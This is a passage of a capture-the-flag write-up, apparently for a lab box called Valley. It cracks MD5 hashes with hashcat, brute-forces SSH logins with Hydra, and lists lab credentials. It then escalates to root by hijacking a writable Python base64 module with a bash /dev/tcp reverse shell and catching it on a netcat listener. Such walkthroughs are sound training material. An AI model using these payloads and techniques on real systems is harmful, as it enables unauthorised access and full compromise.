+get_extended_indices.constprop.0
+__gconv_transform_internal_ascii
+__gconv_transform_internal_ascii
+__gconv_transform_ascii_internal
+__gconv_transform_ascii_internal
+free(): invalid next size (fast)
+find library=%s [%lu]; searching
+fde_single_encoding_compare.cold
+<strong>e6722920bab2326f8217e4bf6b1b58ac</strong>
+d_index_template_argument.part.0
+dig_no <= (uintmax_t) INTMAX_MAX
+<strong>dd2921cc76ee3abfd2beb60709056cfb</strong>
+__cxa_throw_bad_array_new_length
+(char *) p + size > paligned_mem
+cannot create RUNPATH/RPATH copy
+cannot change memory protections
+activating NODELETE for %s [%lu]
+
+# We found two potential hashes, let's check them
+```
+
+
+
+
+
+---
+
+
+
+
+
+
+
+
+
+[Check Hashes](https://hashes.com/en/tools/hash_identifier)
+
+
+
+
+
+
+
+```
+# MD5
+
+<strong>e6722920bab2326f8217e4bf6b1b58ac</strong>
+<strong>dd2921cc76ee3abfd2beb60709056cfb</strong>
+```
+
+
+
+
+
+
+
+---
+
+
+
+
+
+#### Exploitation
+
+
+
+
+
+##### HASHCAT - WEAK PASSWORDS
+
+
+
+
+
+```
+# Save the hashes in a file called:
+<strong>password.hashes</strong>
+```
+
+
+
+
+
+```
+# hashcat -m 0 == for MD5
+hashcat -m 0 -a 0 -o cracked-password.txt password.hashes /usr/share/wordlists/rockyou.txt
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 0 (MD5)
+Hash.Target......: password.hashes
+Time.Started.....: Mon Jun 12 23:53:51 2023 (0 secs)
+Time.Estimated...: Mon Jun 12 23:53:51 2023 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........: 63999.2 kH/s (5.22ms) @ Accel:2048 Loops:1 Thr:32 Vec:1
+Recovered........: 2/2 (100.00%) Digests (total), 2/2 (100.00%) Digests (new)
+Progress.........: 3801088/14344385 (26.50%)
+Rejected.........: 0/3801088 (0.00%)
+Restore.Point....: 0/14344385 (0.00%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: 123456 -> shikoshi
+Hardware.Mon.#1..: Temp: 54c Util: 36% Core:1125MHz Mem:7000MHz Bus:8
+
+Started: Mon Jun 12 23:53:50 2023
+Stopped: Mon Jun 12 23:53:52 2023
+```
+
+
+
+
+
+---
+
+
+
+
+
+```
+# We cracked 2/2 hashes !
+dd2921cc76ee3abfd2beb60709056cfb:<strong>valley</strong>
+e6722920bab2326f8217e4bf6b1b58ac:<strong>liberty1</strong>23
+```
+
+
+
+
+
+---
+
+
+
+
+
+#### Privilege Escalation
+
+
+
+
+
+##### LET'S LOGIN WITH A OTHER ACCOUNT
+
+
+
+
+
+```
+# We know the following users exist on the system
+
+<strong>siemDev:?
+valley:?
+valleyDev</strong>:<strong>ph0t0s1234</strong>
+
+# Let's enumerate the other passwords for the user with
+```
+
+
+
+
+
+---
+
+
+
+
+
+##### THC HYDRA - USER / PASSWORD ENUMERATION (WITH KNOWN USERS/PASSWORDS)
+
+
+
+
+
+```
+# Enumerate Password for User == valley
+hydra -l valley -P cracked-password.txt ssh://10.10.228.74
+
+Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-06-13 00:01:06
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 2 tasks per 1 server, overall 2 tasks, 2 login tries (l:1/p:2), ~1 try per task
+[DATA] attacking ssh://10.10.228.74:22/
+[22][ssh] host: 10.10.228.74   login: valley   password: liberty123
+1 of 1 target successfully completed, 1 valid password found
+
+# Enumerate Password for User == siemDev
+hydra -l siemDev -P cracked-password.txt ssh://10.10.228.74
+
+Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-06-13 00:02:04
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 2 tasks per 1 server, overall 2 tasks, 2 login tries (l:1/p:2), ~1 try per task
+[DATA] attacking ssh://10.10.228.74:22/
+1 of 1 target completed, 0 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-06-13 00:02:08
+```
+
+
+
+
+
+```
+# We got now the users
+
+<strong>valley:liberty123
+valleyDev:ph0t0s1234</strong>
+
+# Let's use the new credentials
+```
+
+
+
+
+
+```
+su valley
+liberty123
+```
+
+
+
+
+
+---
+
+
+
+
+
+##### linPEAS PE
+
+
+
+
+
+```
+# Let's check what we got to try a PE (Privilege Escalation)
+
+1. Let's check the cron job owned by root
+/photos/script/<strong>photosEncrypt.py</strong>
+```
+
+
+
+
+
+```
+cat /photos/script/photosEncrypt.py
+```
+
+
+
+
+
+```
+#!/usr/bin/python3
+import base64
+for i in range(1,7):
+# specify the path to the image file you want to encode
+        image_path = "/photos/p" + str(i) + ".jpg"
+
+# open the image file and read its contents
+        with open(image_path, "rb") as image_file:
+          image_data = image_file.read()
+
+# encode the image data in Base64 format
+        encoded_image_data = base64.b64encode(image_data)
+
+# specify the path to the output file
+        output_path = "/photos/photoVault/p" + str(i) + ".enc"
+
+# write the Base64-encoded image data to the output file
+        with open(output_path, "wb") as output_file:
+          output_file.write(encoded_image_data)
+```
+
+
+
+
+
+---
+
+
+
+
+
+```
+# What happens in the code ?
+
+<strong># Step 1</strong>
+It goes through a loop from <strong>1</strong> to <strong>6</strong> (due to the <strong>range(1,7)</strong> function).
+
+<strong># Step 2</strong>
+For each iteration of the loop it sets the path to a specific image file. The path is composed of the base path "<strong><em>/photos/p</em></strong>" and the current number of the iteration (in the form of a string), followed by the file extension "<strong><em>.jpg</em></strong>". For example, in the first iteration the path will be "<strong><em>/photos/p1.jpg</em></strong>", in the second iteration "<strong><em>/photos/p2.jpg</em></strong>" and so on.
+
+<strong># Step 3</strong>
+It opens the specified image file and reads the contents into the variable <strong>image_data</strong>.
+
+<strong># Step 4</strong>
+It encodes the image data in <strong>Base64</strong> format and stores the result in the variable <strong>encoded_image_data</strong>.
+
+<strong># Step 5</strong>
+It sets the path for the output file similar to how it set the path for the image file, but this time it uses the base path "<em><strong>/photos/photoVault/p</strong></em>" and the file extension is "<strong><em>.enc</em></strong>".
+
+<strong># Step 6</strong>
+It writes the Base64 encoded image data to the output file.
+```
+
+
+
+
+
+##### HOW CAN WE ABUSE THIS ?
+
+
+
+
+
+1. 
+2. The script uses the library **base64**
+3. 
+4.
+5. 
+6. We can **hijack this module** to spawn a **ROOT-REVERSE-SHELL**
+7. 
+8.
+9. 
+10. On the ATTACKER machine, we start our **NETCAT** listener
+11. 
+12.
+13. 
+14. On the VICTIM machine, we execute the script
+15. 
+16.
+17. 
+18. Privilege Escalation
+19. 
+
+
+
+
+
+---
+
+
+
+
+
+##### PYTHON - MODULE HIJACKING
+
+
+
+
+
+```
+# Let's find the <strong>base64 library</strong> in the system
+```
+
+
+
+
+
+```
+python3
+```
+
+
+
+
+
+```
+import base64
+print(base64.__file__)
+exit()
+```
+
+
+
+
+
+```
+<strong>/usr/lib/python3.8/base64.py</strong>
+
+# Now let's see if we can edit the file
+```
+
+
+
+
+
+```
+# Check which files we can edit
+find / -writable 2>/dev/null | grep 'python'
+
+/usr/lib/python3.8
+/usr/lib/python3.8/base64.py
+
+# We can edit the file
+nano /usr/lib/python3.8/base64.py
+```
+
+
+
+
+
+```
+# ADD PYTHON REVERSE SHELL
+_ Don't forget to change <strong>IP</strong> and <strong>PORT</strong> to your address
+```
+
+
+
+
+
+```
+"""
+Author      : trustinveritas
+Date        : 2023-06-13
+
+Title       : BEST-SUCCESS-SIMPLE-PYTHON-REVERSE-SHELL.py
+
+Description : Reverse-Shell
+
+"""
+
+# Import Libraries
+import os
+os.system('/bin/bash -c \'bash -i >& /dev/tcp/10.11.8.178/4444 0>&1\'')
+```
+
+
+
+
+
+
+
+
+
+![](./img/wp-content-uploads-2023-06-python-valley.png)
+
+
+
+
+
+
+
+
+
+```
+Ctrl + X
+y
+<Enter>
+```
+
+
+
+
+
+---
+
+
+
+
+
+##### NETCAT LISTENER
+
+
+
+
+
+```
+# Start your NETCAT listener
+```
+
+
+
+
+
+```
+sudo rlwrap nc -lvnp 4444
+
+listening on [any] 4444 ...
+connect to [10.11.8.178] from (UNKNOWN) [10.10.28.65] 48148
+bash: cannot set terminal process group (1009): Inappropriate ioctl for device
+bash: no job control in this shell
+root@valley:~#
+```
+
+
+
+
+
+---
+
+
+
+
+
+##### WE GOT ROOT ACCESS !
+
+
+
+
+
+```
+# Get your flag
+```
+
+
+
+
+
+```
+cat /root/root.txt
+```
+
+
